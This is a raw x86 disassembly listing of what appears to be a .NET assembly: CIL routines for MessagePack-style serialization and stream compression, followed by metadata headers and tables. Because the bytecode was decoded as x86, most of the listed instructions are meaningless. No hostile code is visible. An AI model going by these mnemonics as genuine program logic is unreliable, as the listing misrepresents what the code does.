  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	e8 26 00 00 23       	call   0x23405a4f
  405a29:	53                   	push   %ebx
  405a2a:	74 72                	je     0x405a9e
  405a2c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405a33:	00 10                	add    %dl,(%eax)
  405a35:	45                   	inc    %ebp
  405a36:	00 00                	add    %al,(%eax)
  405a38:	30 29                	xor    %ch,(%ecx)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 40 6e             	add    %al,0x6e(%eax)
  405a42:	00 00                	add    %al,(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 50 6e             	add    %dl,0x6e(%eax)
  405a52:	00 00                	add    %al,(%eax)
  405a54:	40                   	inc    %eax
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	01 02                	add    %eax,(%edx)
  405adc:	01 00                	add    %eax,(%eax)
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	06                   	push   %es
  405ae3:	00 5c 21 20          	add    %bl,0x20(%ecx,%eiz,1)
  405ae7:	18 0a                	sbb    %cl,(%edx)
  405ae9:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  405aed:	1f                   	pop    %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	89 21                	mov    %esp,(%ecx)
  405af2:	b8 20 0a 00 c9       	mov    $0xc9000a20,%eax
  405af7:	17                   	pop    %ss
  405af8:	1d 26 06 00 2f       	sbb    $0x2f000626,%eax
  405afd:	1d c5 13 06 00       	sbb    $0x613c5,%eax
  405b02:	77 10                	ja     0x405b14
  405b04:	48                   	dec    %eax
  405b05:	1f                   	pop    %ds
  405b06:	0a 00                	or     (%eax),%al
  405b08:	0d 19 48 1f 0a       	or     $0xa1f4819,%eax
  405b0d:	00 81 20 1d 26 06    	add    %al,0x6261d20(%ecx)
  405b13:	00 ee                	add    %ch,%dh
  405b15:	21 20                	and    %esp,(%eax)
  405b17:	18 0e                	sbb    %cl,(%esi)
  405b19:	00 a1 1a 01 14 0e    	add    %ah,0xe14011a(%ecx)
  405b1f:	00 2a                	add    %ch,(%edx)
  405b21:	21 01                	and    %eax,(%ecx)
  405b23:	14 06                	adc    $0x6,%al
  405b25:	00 ef                	add    %ch,%bh
  405b27:	24 c5                	and    $0xc5,%al
  405b29:	13 06                	adc    (%esi),%eax
  405b2b:	00 8e 1c 82 23 06    	add    %cl,0x623821c(%esi)
  405b31:	00 aa 18 20 18 0a    	add    %ch,0xa182018(%edx)
  405b37:	00 d1                	add    %dl,%cl
  405b39:	1f                   	pop    %ds
  405b3a:	2b 00                	sub    (%eax),%eax
  405b3c:	06                   	push   %es
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	c7                   	(bad)
  405b41:	0a 12                	or     (%edx),%dl
  405b43:	00 19                	add    %bl,(%ecx)
  405b45:	00 e0                	add    %ah,%al
  405b47:	1e                   	push   %ds
  405b48:	12 00                	adc    (%eax),%al
  405b4a:	01 00                	add    %eax,(%eax)
  405b4c:	20 18                	and    %bl,(%eax)
  405b4e:	12 00                	adc    (%eax),%al
  405b50:	ad                   	lods   %ds:(%esi),%eax
  405b51:	10 e0                	adc    %ah,%al
  405b53:	1e                   	push   %ds
  405b54:	06                   	push   %es
  405b55:	00 18                	add    %bl,(%eax)
  405b57:	10 20                	adc    %ah,(%eax)
  405b59:	18 06                	sbb    %al,(%esi)
  405b5b:	00 f4                	add    %dh,%ah
  405b5d:	13 82 23 06 00 95    	adc    -0x6afff9dd(%edx),%eax
  405b63:	1d 3b 20 06 00       	sbb    $0x6203b,%eax
  405b68:	59                   	pop    %ecx
  405b69:	0e                   	push   %cs
  405b6a:	3b 20                	cmp    (%eax),%esp
  405b6c:	06                   	push   %es
  405b6d:	00 f1                	add    %dh,%cl
  405b6f:	17                   	pop    %ss
  405b70:	66 05 06 00          	add    $0x6,%ax
  405b74:	ba 11 e0 1e 06       	mov    $0x61ee011,%edx
  405b79:	00 27                	add    %ah,(%edi)
  405b7b:	12 e0                	adc    %al,%ah
  405b7d:	1e                   	push   %ds
  405b7e:	06                   	push   %es
  405b7f:	00 d7                	add    %dl,%bh
  405b81:	10 90 1e 6f 00 00    	adc    %dl,0x6f1e(%eax)
  405b87:	1f                   	pop    %ds
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 ff                	add    %bh,%bh
  405b8d:	10 b1 19 06 00 86    	adc    %dh,-0x79fff9e7(%ecx)
  405b93:	11 b1 19 06 00 67    	adc    %esi,0x67000619(%ecx)
  405b99:	11 b1 19 06 00 0e    	adc    %esi,0xe000619(%ecx)
  405b9f:	12 b1 19 06 00 da    	adc    -0x25fff9e7(%ecx),%dh
  405ba5:	11 b1 19 06 00 f3    	adc    %esi,-0xcfff9e7(%ecx)
  405bab:	11 b1 19 06 00 16    	adc    %esi,0x16000619(%ecx)
  405bb1:	11 b1 19 06 00 4a    	adc    %esi,0x4a000619(%ecx)
  405bb7:	11 b1 19 06 00 31    	adc    %esi,0x31000619(%ecx)
  405bbd:	11 18                	adc    %ebx,(%eax)
  405bbf:	14 06                	adc    $0x6,%al
  405bc1:	00 eb                	add    %ch,%bl
  405bc3:	10 c1                	adc    %al,%cl
  405bc5:	1e                   	push   %ds
  405bc6:	06                   	push   %es
  405bc7:	00 bc 10 e0 1e 06 00 	add    %bh,0x61ee0(%eax,%edx,1)
  405bce:	a3 11 b1 19 06       	mov    %eax,0x619b111
  405bd3:	00 a4 0b c5 13 06 00 	add    %ah,0x613c5(%ebx,%ecx,1)
  405bda:	42                   	inc    %edx
  405bdb:	23 20                	and    (%eax),%esp
  405bdd:	18 06                	sbb    %al,(%esi)
  405bdf:	00 75 22             	add    %dh,0x22(%ebp)
  405be2:	20 18                	and    %bl,(%eax)
  405be4:	06                   	push   %es
  405be5:	00 f8                	add    %bh,%al
  405be7:	13 82 23 0a 00 7e    	adc    0x7e000a23(%edx),%eax
  405bed:	25 48 1f 06 00       	and    $0x61f48,%eax
  405bf2:	53                   	push   %ebx
  405bf3:	18 9f 25 06 00 5c    	sbb    %bl,0x5c000625(%edi)
  405bf9:	1c 9f                	sbb    $0x9f,%al
  405bfb:	25 06 00 a6 13       	and    $0x13a60006,%eax
  405c00:	9f                   	lahf
  405c01:	25 06 00 3a 1a       	and    $0x1a3a0006,%eax
  405c06:	20 18                	and    %bl,(%eax)
  405c08:	0a 00                	or     (%eax),%al
  405c0a:	ae                   	scas   %es:(%edi),%al
  405c0b:	20 77 21             	and    %dh,0x21(%edi)
  405c0e:	0a 00                	or     (%eax),%al
  405c10:	0c 22                	or     $0x22,%al
  405c12:	77 21                	ja     0x405c35
  405c14:	0a 00                	or     (%eax),%al
  405c16:	fa                   	cli
  405c17:	16                   	push   %ss
  405c18:	77 21                	ja     0x405c3b
  405c1a:	0a 00                	or     (%eax),%al
  405c1c:	c5 25 b8 20 0a 00    	lds    0xa20b8,%esp
  405c22:	37                   	aaa
  405c23:	10 b8 20 0a 00 22    	adc    %bh,0x22000a20(%eax)
  405c29:	10 b8 20 06 00 87    	adc    %bh,-0x78fff9e0(%eax)
  405c2f:	14 20                	adc    $0x20,%al
  405c31:	18 06                	sbb    %al,(%esi)
  405c33:	00 31                	add    %dh,(%ecx)
  405c35:	1c 20                	sbb    $0x20,%al
  405c37:	18 06                	sbb    %al,(%esi)
  405c39:	00 87 18 20 18 0a    	add    %al,0xa182018(%edi)
  405c3f:	00 2e                	add    %ch,(%esi)
  405c41:	20 77 21             	and    %dh,0x21(%edi)
  405c44:	0a 00                	or     (%eax),%al
  405c46:	e8 1f 77 21 06       	call   0x661d36a
  405c4b:	00 4e 20             	add    %cl,0x20(%esi)
  405c4e:	20 18                	and    %bl,(%eax)
  405c50:	06                   	push   %es
  405c51:	00 65 0e             	add    %ah,0xe(%ebp)
  405c54:	20 18                	and    %bl,(%eax)
  405c56:	0a 00                	or     (%eax),%al
  405c58:	bb 17 b8 20 0a       	mov    $0xa20b817,%ebx
  405c5d:	00 01                	add    %al,(%ecx)
  405c5f:	16                   	push   %ss
  405c60:	1d 26 0a 00 dc       	sbb    $0xdc000a26,%eax
  405c65:	22 77 21             	and    0x21(%edi),%dh
  405c68:	0a 00                	or     (%eax),%al
  405c6a:	c3                   	ret
  405c6b:	19 48 1f             	sbb    %ecx,0x1f(%eax)
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	0c 20                	or     $0x20,%al
  405c72:	92                   	xchg   %eax,%edx
  405c73:	19 06                	sbb    %eax,(%esi)
  405c75:	00 67 12             	add    %ah,0x12(%edi)
  405c78:	20 18                	and    %bl,(%eax)
  405c7a:	06                   	push   %es
  405c7b:	00 25 16 c5 13 06    	add    %ah,0x613c516
  405c81:	00 f3                	add    %dh,%bl
  405c83:	15 20 18 0a 00       	adc    $0xa1820,%eax
  405c88:	8f                   	(bad)
  405c89:	15 20 18 0a 00       	adc    $0xa1820,%eax
  405c8e:	04 10                	add    $0x10,%al
  405c90:	20 18                	and    %bl,(%eax)
  405c92:	06                   	push   %es
  405c93:	00 67 1d             	add    %ah,0x1d(%edi)
  405c96:	20 18                	and    %bl,(%eax)
  405c98:	06                   	push   %es
  405c99:	00 29                	add    %ch,(%ecx)
  405c9b:	23 c5                	and    %ebp,%eax
  405c9d:	13 06                	adc    (%esi),%eax
  405c9f:	00 eb                	add    %ch,%bl
  405ca1:	17                   	pop    %ss
  405ca2:	66 05 06 00          	add    $0x6,%ax
  405ca6:	00 1e                	add    %bl,(%esi)
  405ca8:	c5 13                	lds    (%ebx),%edx
  405caa:	0a 00                	or     (%eax),%al
  405cac:	0a 0e                	or     (%esi),%cl
  405cae:	b8 20 06 00 36       	mov    $0x36000620,%eax
  405cb3:	01 20                	add    %esp,(%eax)
  405cb5:	18 06                	sbb    %al,(%esi)
  405cb7:	00 b0 1a 66 05 0a    	add    %dh,0xa05661a(%eax)
  405cbd:	00 a6 20 90 1e 0a    	add    %ah,0xa1e9020(%esi)
  405cc3:	00 f2                	add    %dh,%dl
  405cc5:	1a 90 1e 06 00 88    	sbb    -0x77fff9e2(%eax),%dl
  405ccb:	25 2b 00 06 00       	and    $0x6002b,%eax
  405cd0:	49                   	dec    %ecx
  405cd1:	1d 66 05 06 00       	sbb    $0x60566,%eax
  405cd6:	52                   	push   %edx
  405cd7:	15 66 05 0a 00       	adc    $0xa0566,%eax
  405cdc:	10 0f                	adc    %cl,(%edi)
  405cde:	90                   	nop
  405cdf:	1e                   	push   %ds
  405ce0:	06                   	push   %es
  405ce1:	00 c3                	add    %al,%bl
  405ce3:	1a 66 05             	sbb    0x5(%esi),%ah
  405ce6:	0a 00                	or     (%eax),%al
  405ce8:	2e 0f 90 1e          	seto   %cs:(%esi)
  405cec:	06                   	push   %es
  405ced:	00 fa                	add    %bh,%dl
  405cef:	25 2b 00 16 00       	and    $0x16002b,%eax
